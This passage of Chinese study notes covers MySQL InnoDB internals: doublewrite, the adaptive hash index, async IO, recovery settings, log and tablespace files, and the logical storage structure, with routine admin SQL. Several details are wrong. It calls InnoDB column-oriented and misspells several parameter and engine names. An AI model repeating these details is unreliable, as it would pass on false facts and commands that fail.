&quot;innodb_dblwr%&quot;\G;</span><br></pre></td></tr></table></figure><p>参数<strong>Innodb_buffer_pool_pages_flushed</strong>表示当前从缓冲池中刷新到磁盘页的数量。</p><p>用户若需要统计数据库在生产环境中写入的量，最安全的方法还是根据<strong>Innodb_dblwr_pages_written</strong>进行统计。</p><p>参数<strong>skip_innodb_doublewrite</strong>可以禁止使用doublewrite功能，这时可能会发生写失效的问题。</p><h4 id="2-4-3-自适应哈希索引"><a href="#2-4-3-自适应哈希索引" class="headerlink" title="2.4.3 自适应哈希索引"></a>2.4.3 自适应哈希索引</h4><p>哈希查找时间复杂度为O（1），仅需一次就能找到。B+树查找次数取决于B+树的高度，生产环境中B+树高度一般为3<del>4层，故需要3</del>4次查询。</p><p>InnoDB存储引擎监控表上各索引页的查询。如果建立哈希索引可以带来速度提升，则建立哈希索引，称之为<strong>自适应哈希索引（AHI）</strong>。</p><p>AHI通过缓冲池中B+树页构造，无需为整张表构建哈希索引。InnoDB存储引擎根据访问频率和模式自动为<strong>热点页</strong>建立哈希索引。</p><p><strong>AHI要求对这个页的连续访问模式是一样的。</strong></p><blockquote><p>例如(a,b)的联合索引页<br>访问模式可以是如下情况:<br>where a=xxx<br>where a=xxx and b=xxx</p></blockquote><p>访问模式一样指的是查询条件一样。AHI还有如下要求：</p><ol><li>以该模式访问100次</li><li>页通过该模式访问了N次，其中N=页中记录*1/16</li></ol><p>启用AHI后，读取和写入速度可以提高2倍，辅助索引连接操作性能提高5倍。AHI是非常好的优化模式，设计思想是数据库自优化。</p><p><strong>注意</strong></p><ul><li>哈希索引只能用来搜索等值的查询（=），而不能用来做范围查询的（between  and  )</li><li>默认AHI为开启状态</li><li>参数innodb_adaptive_hash_index考虑是否禁用此特性</li></ul><h4 id="2-4-4-异步IO"><a href="#2-4-4-异步IO" class="headerlink" title="2.4.4 异步IO"></a>2.4.4 异步IO</h4><p>为提高磁盘操作性能，数据库都采用异步IO方式处理磁盘操作。</p><p>**AIO（Asynchronous IO)**用户在发出一个IO请求后立即发出另一个IO请求，当全部IO请求发送完毕后，等待所有IO操作完成，这就是AIO。</p><p>AIO的另一个优势就是可以进行 IO Merge操作，多个IO合并为1个IO，提高IOPS性能。</p><p>从1.1x开始，提供了内核级别的AIO支持，称为Native AIO。</p><p>参数<strong>innodb_use_native_aio</strong>可以通过开启和关闭Native AIO比较Innodb的性能。启用Native AIO，恢复速度提高75%</p><p>磁盘的写入操作则全部由AIO完成。</p><h4 id="2-4-5-刷新邻接页"><a href="#2-4-5-刷新邻接页" class="headerlink" title="2.4.5 刷新邻接页"></a>2.4.5 刷新邻接页</h4><p>工作原理为：当刷新一个脏页时，InnoDB存储引擎检测该页所在区的所有页，如果是脏页，那么一起刷新。</p><p>通过AIO可以将多以IO写入操作合并为一个IO操作。</p><p>InnoDB存储引擎从1.2x提供参数<strong>innodb_flush_neighobrs</strong>，用来控制是否启用该特性。</p><ol><li><p>对于传统机械硬盘建议启用特性</p></li><li><p>对于固态硬盘有着超高的IOPS性能的磁盘，建议关闭特性。</p><p>原因：可能将不怎么脏的页进行写入，而该页之后又很快变成脏页</p></li></ol><h3 id="2-5-启动、关闭与恢复"><a href="#2-5-启动、关闭与恢复" class="headerlink" title="2.5 启动、关闭与恢复"></a>2.5 启动、关闭与恢复</h3><p>参数<strong>innodb_fast_shutdown</strong>影响着表的存储引擎为InnoDB的行为。默认值为1</p><ul><li>0表示在数据库关闭时，Innodb完成所有的full  purge和merge insert buffer，将所有的脏页刷新回磁盘。耗费时间，在进行Innodb升级时，需要调为0，再关闭数据库</li><li>1表示不需要上述的操作，但是再缓冲中的一些数据脏页还是会刷新回磁盘</li><li>2表示不完成full purge和merge insert buffer操作，也不将缓冲中的数据脏页写回磁盘，而是将日志都写入日志文件。下次数据库启动时，会进行恢复操作。</li></ul><p>数据库非正常关闭时，如Kill命令关闭数据库，参数设为2时，会对InnoDB存储引擎的表进行恢复操作。</p><p>参数<strong>innodb_force_recovery</strong>影响存储引擎恢复情况。默认值为0</p><ul><li>0表示恢复时进行所有的恢复操作，当不能进行有效恢复时，如数据页发生corruption，mysql发生宕机，把错误写入到错误日志中去。</li><li>1表示忽略检查到的corrupt页</li><li>2表示阻止Master Thread线程运行</li><li>3表示不进行事务的回滚操作</li><li>4表示不进行插入缓冲的合并操作</li><li>5表示不查看撤销日志，Innodb存储引擎会将未提交的事务视为已提交</li><li>6表示不进行前滚的操作</li></ul><p>当该参数设置值大于0后，用户可以对表进行select,create,drop,但是不能进行insert、update、delete这些操作。</p><h2 id="3-文件"><a href="#3-文件" class="headerlink" title="3.文件"></a>3.文件</h2><h3 id="3-1-参数文件"><a href="#3-1-参数文件" class="headerlink" title="3.1 参数文件"></a>3.1 参数文件</h3><p>mysql实例启动时，数据库会先去读配置参数文件，寻找数据库各种文件所在位置以及指定某些初始化参数，这些参数定义了某种内存结构有多大。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查找指定顺序的文件</span><br><span class="line">mysql--help | grep my.cnf</span><br></pre></td></tr></table></figure><p>比较：</p><p>Oracle实例启动时找不到参数文件，不能进行装载操作。</p><p>Mysql实例可以不需要参数文件，所有的参数值取决于编译Mysql时指定的默认值和源代码指定参数的默认值。如果Mysql实例再默认的数据库目录下找不到Mysql架构，启动仍然会失败。</p><p>MySQL的mysql 架构中记录了访问该实例的权限，当找不到这个架构时，mysql不会成功。</p><h4 id="3-1-1-参数"><a href="#3-1-1-参数" class="headerlink" title="3.1.1 参数"></a>3.1.1 参数</h4><p>数据库参数是一个个键/值对。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看数据库中所有的参数</span><br><span class="line">show variables;</span><br></pre></td></tr></table></figure><h4 id="3-1-2-参数类型"><a href="#3-1-2-参数类型" class="headerlink" title="3.1.2 参数类型"></a>3.1.2 参数类型</h4><p>1.动态参数</p><p>意味着可以在mysql实例运行中进行更改。可以通过SET命令对动态的参数值进行修改<img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211022125716.png"></p><p>对变量的全局进行了修改，再这次实例生命周期都有效，但是mysql实例本身并不会对参数文件中的值进行修改。下次启动时mysql实例还是会读取参数文件。若想下次启动参数值保留，必须去修改参数文件。</p><p>2.静态参数</p><p>再整个实例声明周期内都不得进行更改，就好像是只读的。</p><h3 id="3-2-日志文件"><a href="#3-2-日志文件" class="headerlink" title="3.2 日志文件"></a>3.2 日志文件</h3><p>记录了影响mysql数据库的各种类型活动。包括：</p><ol><li>错误日志</li><li>二进制日志</li><li>慢查询日志</li><li>查询日志</li></ol><h4 id="3-2-1-错误日志"><a href="#3-2-1-错误日志" class="headerlink" title="3.2.1 错误日志"></a>3.2.1 错误日志</h4><p>错误日志文件对Mysql启用、运行、关闭过程进行了记录。在遇到问题时，应首先查看该文件以便定位问题。得到一些关于数据库优化的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看错误日志文件的位置</span><br><span class="line">show variables like &quot;log_error&quot;</span><br></pre></td></tr></table></figure><h4 id="3-2-2-慢查询日志"><a href="#3-2-2-慢查询日志" class="headerlink" title="3.2.2 慢查询日志"></a>3.2.2 慢查询日志</h4><p>慢查询日志(slow log)定位可能存在的SQL语句，从而进行SQL语句层面的优化。</p><p>可以再mysql启动时设一个阈值，将运行时间超过该值的所有sql语句都记录到慢查询日志文件中。从而DBA可以对sql语句进行优化。</p><p>该阈值通过参数<strong>long_query_time</strong>来设置，默认值为10。</p><p>默认mysql并不启动慢查询日志，需要用户自动设置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查询阈值</span><br><span class="line">show variables like &quot;long_query_time&quot;</span><br><span class="line">&#x2F;&#x2F;查看慢查询日志文件打开状态</span><br><span class="line">show variables like &quot;long_slow_queries&quot;</span><br></pre></td></tr></table></figure><p>参数<strong>log_queries_not_using_indexes</strong>，运行的SQL没有使用索引，则Mysql数据库同样会将这条sql语句记录到慢查询日志文件中。</p><p>参数<strong>log_throttle_queries_not_using_indexes</strong>，用来表示每分钟允许记录到slow log的且未使用索引的SQL语句次数。默认值为0，表示没有限制。生产环境下，若没有使用索引，此类sql语句会频繁地记录到slow log。导致slow log文件不断增加，因此DBA应该配置。</p><p>当大量地sql查询记录到慢查询日志文件中，需要使用mysqldumpslow命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysqldumpslow nh122-190-slow.log</span><br><span class="line"></span><br><span class="line">-s, 是表示按照何种方式排序</span><br><span class="line">c: 访问计数</span><br><span class="line">l: 锁定时间</span><br><span class="line">r: 返回记录</span><br><span class="line">t: 查询时间</span><br><span class="line">al:平均锁定时间</span><br><span class="line">ar:平均返回记录数</span><br><span class="line">at:平均查询时间</span><br><span class="line">-t, 是top n的意思，即为返回前面多少条的数据；</span><br><span class="line">-g, 后边可以写一个正则匹配模式，大小写不敏感的；</span><br><span class="line"></span><br><span class="line">得到返回记录集最多的10个SQL。</span><br><span class="line">mysqldumpslow -s r -t 10 &#x2F;database&#x2F;mysql&#x2F;mysql06_slow.log</span><br><span class="line">得到访问次数最多的10个SQL</span><br><span class="line">mysqldumpslow -s c -t 10 &#x2F;database&#x2F;mysql&#x2F;mysql06_slow.log</span><br><span class="line">得到按照时间排序的前10条里面含有左连接的查询语句。</span><br><span class="line">mysqldumpslow -s t -t 10 -g “left join” &#x2F;database&#x2F;mysql&#x2F;mysql06_slow.log</span><br><span class="line">另外建议在使用这些命令时结合 | 和more 使用 ，否则有可能出现刷屏的情况。</span><br><span class="line">mysqldumpslow -s r -t 20 &#x2F;mysqldata&#x2F;mysql&#x2F;mysql06-slow.log | more</span><br></pre></td></tr></table></figure><p>mysql 5.1开始将慢查询日志记录放在一张表中。该表再mysql架构下，名为slow_log</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看表结构</span><br><span class="line">show create table mysql.slow_log\G;</span><br><span class="line">&#x2F;&#x2F;修改慢查询输出地格式，默认为FILE，将它设为TABLE</span><br><span class="line">show variables like &quot;log_output&quot;\G;</span><br><span class="line">Set global log_output&#x3D;&quot;TABLE&quot;;</span><br><span class="line">select * from mysql.slow_log\G;</span><br></pre></td></tr></table></figure><p>slow_log使用CSV引擎，对大数据量下查询效率不高。用户可以把slow_log表引擎换为MyISAM，并在start_time列上添加索引提高效率。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;修改表的引擎   已经开启了慢查询会报错</span><br><span class="line">Alter table mysql.slow_log engine&#x3D;myism</span><br><span class="line">&#x2F;&#x2F;关闭慢查询</span><br><span class="line">set global slow_query_log&#x3D;off</span><br></pre></td></tr></table></figure><p>参数<strong>long_query_io</strong>将超过指定逻辑IO次数的sql语句记录到slow log中。默认值为100.</p><p>参数<strong>slow_query_type</strong>用来表示启用slow log的方式</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211022161809.png"></p><h4 id="3-2-3-查询日志"><a href="#3-2-3-查询日志" class="headerlink" title="3.2.3 查询日志"></a>3.2.3 查询日志</h4><p>记录了所有对mysql数据库请求的信息。默认文件名：主机名.log</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211022162350.png"></p><p>MySQL 5.1后 查询日志的记录放入mysql架构下的general_log表中</p><h4 id="3-2-4-二进制日志"><a href="#3-2-4-二进制日志" class="headerlink" title="3.2.4 二进制日志"></a>3.2.4 二进制日志</h4><p>记录了对mysql数据库执行更改的所有操作。不包括select和show操作。（binary log)。select 和show 只能使用查询日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看master数据库当前正在使用的二进制日志及当前执行二进制日志位置</span><br><span class="line">show master status</span><br><span class="line">&#x2F;&#x2F;查看所有二进制日志列表</span><br><span class="line">show master logs</span><br><span class="line">&#x2F;&#x2F;查看binlog内容</span><br><span class="line">show binlog events</span><br></pre></td></tr></table></figure><p>二进制日志的主要作用：</p><ol><li><strong>恢复</strong>：数据恢复使用二进制日志（通过二进制日志进行point-in-time的恢复)</li><li><strong>复制</strong>:通过复制和执行二进制日志使一台远程的Mysql数据库（一般称为slave或primary）进行实时同步。主从复制</li><li><strong>审计</strong>：通过对二进制日志中信息来进行审计，判断是否有对数据库进行注入的攻击。</li></ol><p>通过参数配置log-bin[=name]可以启动二进制日志。若不指定name，默认为二进制日志文件名为主机名，后缀为二进制日志的序列号，所在路径为数据库所在目录（datadir）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;datadir&quot;</span><br><span class="line">system ls lh 上一行输出的值</span><br></pre></td></tr></table></figure><p>bing_log.index存储过往产生的二进制日志序列号。</p><p><strong>二进制日志文件默认没有启动。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看是否打开了二进制日志文件</span><br><span class="line">show variables like &#39;log_bin&#39;;</span><br></pre></td></tr></table></figure><p>以下参数影响着二进制日志记录的信息和行为：</p><p><strong>1.max_binlog_size</strong></p><p>指定了单个二进制日志文件的最大值，超过该值，产生新的二进制日志文件，后缀名+1，记录到.index文件。默认大小为1G；</p><p><strong>2.binlog_cache_size</strong></p><p>当使用事务的表存储引擎（INNODB）时，所有未提交的二进制日志会被记录到一个缓冲中去，等待事务提交时直接将缓冲中的二进制日志写入二进制日志文件，该参数指定了缓冲的大小。默认为32K</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Binglog_cache_use记录了使用缓冲写二进制日志的次数</span><br><span class="line">show global status like &quot;binlog_cache_use&quot;\G;</span><br><span class="line">&#x2F;&#x2F;查看bing_cache_size大小</span><br><span class="line">show variables like &quot;binglog_cache_size&quot;</span><br><span class="line">&#x2F;&#x2F;查看binglog_cache状态(同时查看binlog_cache_disk_use和binlog_cache_use)</span><br><span class="line">show global status like &quot;binlog_cache%&quot;</span><br></pre></td></tr></table></figure><p><strong>3.sync_binlog</strong></p><p>二进制日志并不是每次写都同步到磁盘（缓冲写）。当数据库发生宕机时，可能有一部分数据没有写入二进制日志文件中。</p><p>该参数sync_binlog=[N] 表示每写缓冲多少次就同步到磁盘。默认为0，1表示同步写，这是写操作不适用操作系统的缓冲来写二进制日志。</p><p><strong>4.innodb_support_xa</strong></p><p>因为sync_binlog设为1后，发生同步写，但是由于一个事务还未commit，但是这时已经写入 了二进制日志，此时数据库发生宕机，当下次mysql数据库启动时，由于该事务没有提交，事务会被回滚。但是二进制日志已经记录了，出现问题。</p><p>该参数设为1，确保了二进制日志和InnoDB存储引擎数据文件的同步。</p><p><strong>5.binglog-do-db</strong></p><p>表示需要写入那些库的日志</p><p>默认为空，表示需要同步所有库的日志到二进制日志</p><p><strong>6.binlog-ignore-db</strong></p><p>表示需要忽略吸入哪些库的日志</p><p>默认为空，表示需要同步所有库的日志到二进制日志</p><p><strong>7.log-slave-update</strong></p><p>如果该数据库是主从复制中的从的话，不会从master取得并执行二进制日志写入自己的二进制日志文件中去。若需要，要设置该参数。</p><p>要搭建master=&gt;slave=&gt;slave复制，必须设置该参数。</p><p><strong>8.binlog_format</strong></p><p>影响记录二进制日志的格式。影响InnoDB存储引擎的默认事务隔离级别（REPEATABLE READ 会出现类似丢失更新的现象，从而出现主从数据库上的数据不一致)。</p><p>参数可设值有</p><ol><li><p>STATEMENT</p><p>和之前的版本一致，二进制日志文件记录的是日志逻辑SQL语句</p></li><li><p>ROW</p><p>记录表的更改情况。基于ROW格式的复制类似于Oracle的物理Standby（当然，还是有些区别）</p></li><li><p>MIXED</p><p>mysql默认采用STATEMENT格式进行二进制文件的记录，但是在某些情况下使用ROW格式</p><ol><li>表的存储引擎为NDB，对表的DML操作都会以ROW格式记录</li><li>使用UUID(),USER(),CURRENT_USER(),FOUND_ROWS(),ROW_COUNT()等不确定函数</li><li>使用了INSERT DELAY 语句</li><li>使用了用户定义函数（UDF)</li><li>使用了临时表</li></ol></li></ol><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211024125336.png"></p><p>binlog_format是动态参数，可以在数据库允许环境下进行更改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;更改当前会话binlog_format设为ROW</span><br><span class="line">set @@session.binlog_format&#x3D;&#39;ROW&#39;;</span><br><span class="line">&#x2F;&#x2F;查询当前会话的binlog_format</span><br><span class="line">select @@session.binlog_format;</span><br><span class="line">&#x2F;&#x2F;设置全局的binlog_format</span><br><span class="line">set global binlog_format&#x3D;&quot;ROW&quot;</span><br></pre></td></tr></table></figure><p>参数<strong>binlog_format</strong>设置为ROW，会对磁盘空间有一定的增加。</p><p>查看二进制日志文件不能使用像<strong>错误日志文件</strong>、<strong>慢查询日志文件</strong>那样使用<strong>cat</strong>、<strong>head</strong>、<strong>tail</strong>等命令来查看。</p><p>要查看二进制日志文件需要使用mysql提供的工具<strong>mysqlbinlog</strong>，对于STATEMENT格式的二进制日志文件，使用mysqlbinlog后，看到的就是执行的逻辑SQL语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-d, --database&#x3D;name      仅显示指定数据库的转储内容。</span><br><span class="line">-o, --offset&#x3D;#           跳过前N行的日志条目。</span><br><span class="line">-r, --result-file&#x3D;name   将输入的文本格式的文件转储到指定的文件。</span><br><span class="line">-s, --short-form         使用简单格式。</span><br><span class="line">--set-charset&#x3D;name       在转储文件的开头增加&#39;SET NAMES character_set&#39;语句。</span><br><span class="line">--start-datetime&#x3D;name    转储日志的起始时间。</span><br><span class="line">--stop-datetime&#x3D;name     转储日志的截止时间。</span><br><span class="line">-j, --start-position&#x3D;#   转储日志的起始位置。</span><br><span class="line">--stop-position&#x3D;#        转储日志的截止位置。</span><br></pre></td></tr></table></figure><h3 id="3-3-套接字文件"><a href="#3-3-套接字文件" class="headerlink" title="3.3 套接字文件"></a>3.3 套接字文件</h3><p>UNIX系统下本地连接mysql可以采用UNIX域套接字方式，这种方式需要一个套接字文件。</p><p>套接字文件由参数socket控制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看套接字文件路径</span><br><span class="line">show variables like &quot;socket&quot;</span><br></pre></td></tr></table></figure><h3 id="3-4-Pid文件"><a href="#3-4-Pid文件" class="headerlink" title="3.4 Pid文件"></a>3.4 Pid文件</h3><p>mysql实例启动时，将自己的进程ID写入一个文件中，该文件即为Pid文件。由参数pid_file控制，默认位于数据库目录下，文件名为主机名.pid</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看Pid文件路径</span><br><span class="line">show variables like &quot;pid_file&quot;\G;</span><br><span class="line">show variables like &quot;%pid%&quot;;</span><br></pre></td></tr></table></figure><h3 id="3-5-表结构定义文件（frm文件）"><a href="#3-5-表结构定义文件（frm文件）" class="headerlink" title="3.5 表结构定义文件（frm文件）"></a>3.5 表结构定义文件（frm文件）</h3><p>mysql数据的存储时根据表进行的，每个表都有其对应的文件，无论采用什么存储引擎，后缀名为frm的文件定义了该表的结构定义。</p><p>frm文件还可以用来存放视图的定义，该文件是文本文件,可以直接用cat命令进行查看。</p><h3 id="3-6-InnoDB存储引擎文件"><a href="#3-6-InnoDB存储引擎文件" class="headerlink" title="3.6 InnoDB存储引擎文件"></a>3.6 InnoDB存储引擎文件</h3><p>每个存储引擎都有自己独有的文件。</p><h4 id="3-6-1-表空间文件"><a href="#3-6-1-表空间文件" class="headerlink" title="3.6.1 表空间文件"></a>3.6.1 表空间文件</h4><p>用来管理InnoDB的存储</p><p>InnoDB采用将存储的数据按表空间进行存放设计。默认配置下会有一个初始化大小为10MB，名为ibdatea1的文件。该文件是默认的表空间文件，用户可以通过参数innodb_data_file_path进行设置。</p><p>用户可以通过多个文件组成一个表空间，同时制定文件的属性。</p><p>设置<strong>innodb_data_file_path</strong>参数后，所有基于InnoDB存储引擎的表数据都会记录到该共享空间中。</p><p>设置<strong>innodb_file_per_table</strong>参数后，用户可以将每个基于InnoDB存储引擎的表产生一个独立表空间。独立表空间的命名为：表名.ibd。通过该方式，用户不用将所有数据都存放于默认的表空间中。</p><p>单独的idb表空间文件仅存储该表的数据、索引和插入缓冲BITMAP等信息，其余的信息还是存放在默认的表空间中。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211024143353.png"></p><h4 id="3-6-2-重做日志文件"><a href="#3-6-2-重做日志文件" class="headerlink" title="3.6.2 重做日志文件"></a>3.6.2 重做日志文件</h4><p>用来记录InnoDB的事务日志</p><p>默认情况下，InnoDB存储引擎数据目录下有两个名为ib_logfile()和ib_logfile1的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看重做日志参数情况</span><br><span class="line">show variables like &quot;innodb%log%&quot;\G;</span><br></pre></td></tr></table></figure><p>下列参数影响重做日志文件的属性：</p><p>1.innodb_log_file_size</p><p>指定了每个重做日志文件的大小</p><p>2.innodb_log_files_in_group</p><p>日志文件组中重做日志文件的数量，默认为2</p><p>3.innodb_mirrored_log_groups</p><p>指定了日志镜像文件组的数量，默认为1，表示只有一个日志文件组，没有镜像</p><p>4.innodb_log_group_home_dir</p><p>指定了日志文件组所在的路径，默认/</p><p>p101二进制日志和重做日志的区别</p><p>InnoDB存储引擎的重做日志只记录有关存储引擎本身的事务日志，而且记录的是关于每个页的更改的物理情况，事务的进行中，不断有重做日志条目被写入到重做日志文件中。</p><hr><p>InnoDB存储引擎中，对于不同的操作有着不同的重做日志格式。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211024145207.png"></p><p>redo_log_type:占用1字节，重做日志类型</p><p>space: 表空间的ID，采用压缩的方式，占用空间可能小于4字节</p><p>page_no:表示页的偏移量，同样采用压缩方式</p><p>redo_log_body:每个重做日志的数据部分，恢复时需要调用相应函数解析</p><hr><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211024145601.png"></p><p>从日志缓冲写入磁盘上的重做日志文件按一定条件进行：</p><ol><li>master thread 每秒会将重做日志缓冲写入磁盘的重做日志文件中，不论事务是否提交</li><li>由参数<strong>innodb_flush_log_at_trx_commit</strong>控制，表示在提交时，处理重做日志的方式。</li></ol><p><strong>innodb_flush_log_at_trx_commit</strong>有效值有</p><ul><li>0代表提交事务时，并不将事务的重做日志写入磁盘的日志文件，而是等待主线程每秒的刷新。</li><li>1表示在执行commit时将重做日志缓冲同步写道磁盘。伴有fsync的调用</li><li>2表示将重做日志异步写到磁盘，即写到文件系统的缓存中。不能完全保证在执行commit时肯定会写入重做日志文件。</li></ul><p>为保证事务的ADID的持久性，必须将innodb_flush_log_at_trx_commit设置为1，每当有事务提交时，必须确保事务都已经写入重做日志文件。</p><h2 id="4-表"><a href="#4-表" class="headerlink" title="4.表"></a>4.表</h2><p>数据在表中是如何组织和存放的</p><h3 id="4-1-索引组织表"><a href="#4-1-索引组织表" class="headerlink" title="4.1 索引组织表"></a>4.1 索引组织表</h3><p>在InnoDB存储引擎中，表是按主键顺序组织存放的，该存储方式为索引组织表。</p><p>创建表时若没有显示定义主键，InnoDB存储引擎按如下方式选择或创建主键</p><ol><li><p>判断表中是否有非空的唯一索引，如果有，则为主键</p></li><li><p>若没有，InnoDB引擎自动创建一个6字节大小的指针</p></li><li><p>当表中有多个非空唯一索引时，InnoDB存储引擎将选择建表时第一个定义的非空唯一索引为主键。</p><p><strong>注意</strong></p><p>主键的选择是根据定义索引的顺序，而不是建表时列的</p></li></ol><blockquote><p>唯一约束与主键约束相似的是它们都可以确保列的唯一性。不同的是，唯一约束在一个表中可有多个，并且设置唯一约束的列允许有空值，但是只能有一个空值。而主键约束在一个表中只能有一个，且不允许有空值。比如，在用户信息表中，为了避免表中用户名重名，可以把用户名设置为唯一约束。</p></blockquote><p>通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名 select 列1，列2...</span><br></pre></td></tr></table></figure><p>可以快速插入数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看某个表的主键</span><br><span class="line">select a,b,c,d,_rowid from z;</span><br></pre></td></tr></table></figure><p>_rowid可以显示表的主键。只能查看单个列为主键的情况，对于多列组成的主键就显得无能为力了。</p><h3 id="4-2-InnoDB逻辑存储结构"><a href="#4-2-InnoDB逻辑存储结构" class="headerlink" title="4.2 InnoDB逻辑存储结构"></a>4.2 InnoDB逻辑存储结构</h3><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211028143947.png"></p><h4 id="4-2-1-表空间"><a href="#4-2-1-表空间" class="headerlink" title="4.2.1 表空间"></a>4.2.1 表空间</h4><p>InnoDB存储引擎逻辑结构的最高层，所有的数据存放在表空间中。</p><p>默认情况下InnoDB存储引擎下有一个共享表空间ibdata1，即所有数据都放在这个表空间内。</p><blockquote><p>Undo 页</p><p>Undo Log的原理很简单，为了满足事务的原子性，在操作任何数据之前，首先将数据备份到一个地方（这个存储数据备份的地方称为Undo Log）。然后进行数据的修改。如果出现了错误或者用户执行了ROLLBACK语句，系统可以利用Undo Log中的备份将数据恢复到事务开始之前的状态。</p></blockquote><p>即使在启用了innodb_file_per_table之后，共享空间还是会不断地增加大小。因为如回滚(undo)信息，插入缓冲索引页，系统事务信息，二次写缓冲还是存放在原来的共享空间内。</p><p>即使事务rollback后InnoDB存储引擎也不会去收缩这个表空间。虽然不会回收但是会将其标记为可用空间，提供下个undo使用</p><h4 id="4-2-2-段"><a href="#4-2-2-段" class="headerlink" title="4.2.2 段"></a>4.2.2 段</h4><p>表空间是由各个段组成的，常见的段由数据段、索引段、回滚段等。</p><p>InnoDB存储引擎表是索引组织的，数据即索引，索引即数据。数据段为B+树的叶子结点，索引段即为B+树的非索引结点。</p><p>Innodb存储引擎中，对段的管理都是由引擎自身完成。</p><h4 id="4-2-3-区"><a href="#4-2-3-区" class="headerlink" title="4.2.3 区"></a>4.2.3 区</h4><p>区是连续页组成的空间，任何情况下每个区的大小都为<strong>1MB</strong>。为了保证区中页的连续性，Innodb引擎一次从磁盘申请4~5个区。InnoDB存储引擎页大小为16KB，即一个区中共有64个连续的页。1MB/16kb=64</p><p>参数<strong>key_block</strong>设置每个页的大小(1.0.x版本)</p><p>参数<strong>innodb_page_size</strong>设置默认页大小(1.2.x版本)</p><h4 id="4-2-4-页"><a href="#4-2-4-页" class="headerlink" title="4.2.4 页"></a>4.2.4 页</h4><p>页是InnoDB磁盘管理的最小单位。每个页默认大小为16KB，从1.2x版本开始可以通过innodb_page_size将页额大小设置为4K,8K,16K。</p><p>页类型有：</p><ol><li>数据页</li><li>undo页</li><li>系统页</li><li>事务数据页</li><li>插入缓冲位图页</li><li>插入缓冲空闲列表页</li><li>未压缩的二进制大对象页</li><li>压缩的二进制大对象页</li></ol><h4 id="4-2-5-行"><a href="#4-2-5-行" class="headerlink" title="4.2.5 行"></a>4.2.5 行</h4><p>InnoDB存储引擎是面向列的，数据是按行进行存放的。每页最多允许存放16KB/2-200行的记录，也就是7992行。</p><h3 id="4-3-InnoDB行记录格式"><a href="#4-3-InnoDB行记录格式" class="headerlink" title="4.3 InnoDB行记录格式"></a>4.3 